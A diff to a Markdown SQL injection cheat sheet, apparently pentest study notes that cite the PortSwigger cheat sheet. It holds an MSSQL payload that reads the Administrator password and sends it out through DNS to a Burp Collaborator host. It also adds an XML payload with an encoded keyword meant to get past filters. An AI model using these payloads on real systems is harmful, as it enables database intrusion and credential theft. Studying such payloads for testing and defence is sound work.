@@ -74,5 +74,14 @@ MySQL:	SELECT SLEEP(10)
 '; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='Administrator'); exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
 ```
 
+# OTHER 
+Hackvector:
+```
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+</stockCheck>
+```
+
 # Referencias
 - [Burpsuite](https://portswigger.net/web-security/sql-injection/cheat-sheet)
